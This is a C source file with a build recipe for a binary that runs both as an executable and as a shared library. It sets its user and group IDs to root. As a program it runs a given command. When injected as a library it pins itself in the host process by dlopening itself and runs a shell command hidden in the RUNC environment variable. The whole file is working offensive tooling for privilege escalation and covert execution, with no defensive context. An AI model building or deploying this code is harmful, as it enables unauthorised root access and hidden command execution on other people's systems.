/**
A template to execute as both an SO and an EXE while still have libc ability.
Update whatever you want in main.

CC = gcc
CFLAGS = -Os -nostdlib -fno-stack-protector -fno-asynchronous-unwind-tables -fno-ident
LDFLAGS = -fPIC -shared -lc \
	-Wl,-e,_start \
	-Wl,--build-id=none -Wl,-z,norelro \
	-Wl,-z,noseparate-code

all: main

main: main.c
	$(CC) $(CFLAGS) main.c -o main $(LDFLAGS)
	strip main
 */
#define _GNU_SOURCE
#include <dlfcn.h>
#include <link.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/syscall.h>
#include <unistd.h>

// DO NOT change this code unless you want to go down a hell hole of linker and loader segfaults

/* Prototype for the libc entry internal */
extern int __libc_start_main(
    int (*main)(int, char**, char**),
    int argc,
    char **argv,
    void (*init)(void),
    void (*fini)(void),
    void (*rtld_fini)(void),
    void *stack_end
);

// This is TECHNICALLY main, but we noop it
int noop() {return 0;}

// technically this is the entrypoint for the exec. But we need to call libc stuff or
// everything will break
int _start();
__asm__(
    ".text\n"
    ".global _start\n"
    "_start:\n\t"
    "xorq %rbp, %rbp\n\t"
    "movq (%rsp), %rsi\n\t"        /* argc */
    "leaq 8(%rsp), %rdx\n\t"       /* argv */
    "movq noop@GOTPCREL(%rip), %rdi\n\t"    /* Load boot address RIP-relative */
    "xorq %rcx, %rcx\n\t"
    "xorq %r8, %r8\n\t"
    "xorq %r9, %r9\n\t"
    "pushq %rsp\n\t"               /* stack_end */
    "call __libc_start_main@PLT\n\t"
    "hlt\n"
);

// ****************************
// BEGIN code we want to change
// ****************************


// Entry point. Technically the entrypoint for the shared object but we just
// use it as both and NOOP the real main.
void main(int argc, char **argv, char **envp) {
    // See if we are the main or a library
    int is_main = getauxval(AT_ENTRY) == (unsigned long)&_start;

    setuid(0);
    setgid(0);
    setsid();

    if (is_main) {
        if (argc > 1) {
            execvpe(argv[1], &argv[1], envp);
            exit(0);
        }
        exit(127);
    } else {
        //printf("I am a shared object\n");
        Dl_info info;
        if (dladdr(_start, &info)) {
            // Fun shared object games. Check if we are dlopened.
            // TODO, its hard to determine if we're preloaded, dlopened, or linked in
            // if we are, we dlopen ourself to increase the counter. therefore when
            // whatever proc opened us calls close, we wont actually unload 😈
            dlopen(info.dli_fname, RTLD_NOW);
        };
        // Find the command to run from RUNC
        for (char **env = envp; *env != 0; env++) {
            if (strncmp(*env, "RUNC=", 5) == 0) {
                char *runc_val = *env + 5;
                if (strlen(runc_val) == 0) {
                    break;
                }
                char *sh_args[] = {"/bin/sh", "-c", runc_val, 0};
                unsetenv("RUNC");
                execve(sh_args[0], sh_args, envp);
            }
        }
        // Dont exit, continue the main program here
    }
}

// Required for the kernel to execute the SO
const char interp[] __attribute__((section(".interp"))) = "/lib64/ld-linux-x86-64.so.2";

// Required for main to be called
__attribute__((section(".init_array"))) 
void (*init_func)(void) = (void (*)(void))main;
